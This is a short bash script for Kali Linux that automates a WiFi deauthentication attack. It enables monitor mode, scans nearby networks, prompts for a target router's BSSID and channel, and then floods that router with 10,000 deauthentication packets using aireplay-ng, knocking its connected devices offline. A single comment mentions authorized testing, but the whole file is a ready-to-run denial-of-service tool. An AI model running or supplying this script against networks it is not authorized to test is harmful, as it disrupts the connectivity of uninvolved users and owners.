#!/bin/bash

# Stops services that may interfere with monitor mode
sudo airmon-ng check kill

# Simple message shown in terminal
echo "Kali Linux opened it's eyes..."
echo "Scanning WiFi networks..."

# Enables monitor mode on wlan0
# Monitor mode allows the adapter to capture nearby WiFi packets
sudo airmon-ng start wlan0

echo "Monitor mode enabled"
echo "Starting network scan..."

# Scans nearby WiFi networks for 10 seconds
# wlan0mon is the monitor mode interface created by airmon-ng
sudo timeout 10 airodump-ng wlan0mon

# User enters the target BSSID (MAC address of WiFi router)
echo "Enter the BSSID:"
read bssid

# User enters the WiFi channel number
echo "Enter the channel number (CH):"
read ch

# Sets the adapter to the selected channel
sudo iwconfig wlan0mon channel $ch

echo "Disconnecting connected devices..."

# Sends deauthentication packets
# This is commonly used for WiFi security testing in authorized environments
sudo aireplay-ng --deauth 10000 -a $bssid wlan0mon

# Stops monitor mode
echo "Stopping monitor mode..."
sudo airmon-ng stop wlan0mon

echo "Kali Linux closed its eyes..."
